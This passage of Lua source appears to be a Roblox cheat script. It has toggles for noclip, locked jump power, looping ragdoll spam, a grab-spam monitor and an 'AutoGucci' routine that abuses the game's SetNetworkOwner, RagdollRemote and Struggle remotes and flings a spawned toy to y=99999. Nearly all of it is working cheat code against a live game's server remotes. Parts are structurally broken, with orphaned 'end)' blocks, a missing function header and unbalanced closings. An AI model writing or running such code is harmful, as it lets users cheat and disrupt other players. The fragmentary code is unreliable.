        local hum = char:WaitForChild("Humanoid")
                local power = (type(jumpPowerV) == "number") and jumpPowerV or 60

        if jumpPowerT then
            hum.JumpPower = power
            local conn
            conn = hum:GetPropertyChangedSignal("JumpPower"):Connect(function()
                if jumpPowerT then
                    if hum.JumpPower ~= power then
                        hum.JumpPower = power
                    end
                else
                    conn:Disconnect()
                end
            end)
        else
            hum.JumpPower = 60
        end
    end

    if plr.Character then apply(plr.Character) end
    plr.CharacterAdded:Connect(apply)
end

 RunService = game:GetService("RunService")

 NO_CLIP_PARTS = {
    "Head",
    "Torso",
    "Left Arm", 
    "Left Leg",
    "Right Arm",
    "Right Leg"
}

function updateNoClipF()
     char = plr.Character
    if not char then return end

    if noClipConnection then
        noClipConnection:Disconnect()
        noClipConnection = nil
    end

    if not noClipT then
        restoreCollision(char)
        return
    end
    
     hrp = char:WaitForChild("HumanoidRootPart")
     hum = char:WaitForChild("Humanoid")

    noClipConnection = RunService.Stepped:Connect(function()
        if not noClipT or not char or not char.Parent then
            if noClipConnection then
                noClipConnection:Disconnect()
                noClipConnection = nil
            end
            return
        end

        for _, partName in ipairs(NO_CLIP_PARTS) do
             part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end)
end

function restoreCollision(char)
    if char then
        for _, partName in ipairs(NO_CLIP_PARTS) do
             part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

    char:WaitForChild("HumanoidRootPart")
    task.wait(0.5)
    
    if noClipT then
        updateNoClipF()
    end
end)

if plr.Character then
    task.wait(1)
    if noClipT then
        updateNoClipF()
    end
end



function masslessF()
    function applyMassless(char)
         hrp = char:WaitForChild("HumanoidRootPart")
         hum = char:WaitForChild("Humanoid")

        if masslessT then
            task.spawn(function()
                while masslessT and char.Parent do
                    for i, e in ipairs(char:GetChildren()) do
                        if e:IsA("BasePart") then
                            e.Massless = false
                        end
                    end
                    task.wait()
                end
            end)
        end
    end

    if plr.Character then
        applyMassless(plr.Character)
    end

    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        applyMassless(char)
    end)
end

function setRagdollF(state)
    char = plr.Character
    hrp = char:WaitForChild("HumanoidRootPart")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs.CharacterEvents.RagdollRemote:FireServer(hrp, state and 1 or 0)
    end
end

function permRagdollLoopF()
    if permRagdollRunningS then return end
    permRagdollRunningS = true
    while permRagdollT do
        setRagdollF(true)
        task.wait(0.001) 
    end
    permRagdollRunningS = false
    setRagdollF(false)
end



Pline = rs.GrabEvents.CreateGrabLine.OnClientEvent
fireCount = {}
function AntiLagF()
    Pline:Connect(function(fromPlr, ...)
        if not antiLagEnabled then return end
        if typeof(fromPlr) ~= "Instance" or not fromPlr:IsA("Player") then return end
        if fromPlr == plr then return end

        local now = os.clock()

        if not fireCount[fromPlr] then 
            fireCount[fromPlr] = {count = 0, start = now} 
        end

        local data = fireCount[fromPlr]

        if now - data.start > 1 then
            data.count = 0
            data.start = now
        end

        data.count += 1

        if data.count >= AntiLagV and not data.isDecreasing then
            data.isDecreasing = true
        
            OrionLib:MakeNotification({Name = "[ lag ]", Content = "by: " .. fromPlr.Name, Time = 3, Image = "rbxassetid://4483345998"})
            plr.PlayerScripts.CharacterAndBeamMove.Enabled = false

            task.spawn(function()
                while data.count > 0 do
                    task.wait(0.1)
                    data.count -= 1
                end

                plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
                fireCount[fromPlr] = nil
            end)
        end
    end)
end


function spawnBlobmanF()
     char = plr.Character
     hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end

     blob = inv and inv:FindFirstChild("CreatureBlobman")
    if blob then
        blobmanInstanceS = blob
        return
    end

     spawnRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
    if spawnRemote then
        task.spawn(function()
        pcall(function()
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.new(0, 0, 0))
        end)
        end)

         tries = 0
        repeat
            task.wait(0.2)
            blobmanInstanceS = inv and inv:FindFirstChild("CreatureBlobman")
            tries += 1
        until blobmanInstanceS or tries > 25
    else
    end
end

function ragdollLoopF()
	if ragdollLoopD then return end
	ragdollLoopD = true

	while sitJumpT do
		char = plr.Character
		hrp = char and char:FindFirstChild("HumanoidRootPart")
		if char and hrp then
			 args = {[1] = hrp, [2] = 0}
			 remote = rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
			if remote then
				remote:FireServer(unpack(args))
			end
		end
		task.wait()
	end

	ragdollLoopD = false
end

function sitJumpF()
    char = plr.Character
    hum = char and char:FindFirstChild("Humanoid")
    if not char or not hum then return end
    seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
    if seat and seat.Occupant ~= hum then
    seat:Sit(hum)
    autoGucciT = false
    sitJumpT = false
end
end

function AutoGucciF()
    while AutoGucciT do
        local success = pcall(function()
            spawnBlobmanF()
        end)

        char = plr.Character
        if not char then
            task.wait(0.1)
            return 
        end

        hrp = char:WaitForChild("HumanoidRootPart")
        hum = char:WaitForChild("Humanoid")
        rag = hum:WaitForChild("Ragdolled")
        held = plr:WaitForChild("IsHeld")

        SpawnToyRemoteFunction = RepStorage.MenuToys.SpawnToyRemoteFunction 
        RagdollRemote = RepStorage.CharacterEvents.RagdollRemote
        DestroyToy = RepStorage.MenuToys.DestroyToy
        seat = blobmanInstanceS:WaitForChild("VehicleSeat"):WaitForChild("ProximityPrompt")

        if not hrp then return end
        OCF = hrp.CFrame

        if not sitJumpT then
            task.spawn(sitJumpF)
            sitJumpT = true
        end

        task.spawn(ragdollLoopF)
        task.wait(0.3)
        
        --fireproximityprompt(seat)
        --task.wait(0.1)
        --hrp.Massless = false
        --task.wait(0.1)
        
        hrp.CFrame = OCF

        successCheck = true
        sitJumpT = false
        RagdollRemote:FireServer(hrp, 0.008)

        while successCheck and AutoGucciT do
            if hum.Health <= 0 then
                if blobmanInstanceS then
                    DestroyToy:FireServer(blobmanInstanceS)
                end
                successCheck = false
                break
            end

            seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
            if seat and seat.Occupant ~= nil then
                DestroyToy:FireServer(blobmanInstanceS)
                successCheck = false
                break
            end

            if rag.Value == true or held.Value == true then
                while (rag.Value == true or held.Value == true) and AutoGucciT do
                    rs.CharacterEvents.Struggle:FireServer()
                    task.wait(0.1)
                end
                successCheck = false
                break
            end

            blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
            if blobHRP then
                SetNetworkOwner = rs:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                pcall(function()
                    SetNetworkOwner:FireServer(blobHRP, hrp)
                end)
                blobHRP.CFrame = CFrame.new( 0, 99999, 100)
            end

            task.wait(0.2)
        end
--[[
        if not successCheck then
            blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
            
            OrionLib:MakeNotification({
                Name = "[ failure ]",
                Content = "Gucci | Retrying",
                Time = 1
            })

            if hum then
                rs.CharacterEvents.Struggle:FireServer(plr)
                hum.Sit = true
                task.wait(0.2)
                hum.Sit = false
                if blobHRP and blobHRP.Position.Y > 9000 then 
                    DestroyToy:FireServer(blobmanInstanceS) 
                end
            end
]]
            sitJumpT = false
            task.wait(1)
        end
    end
end
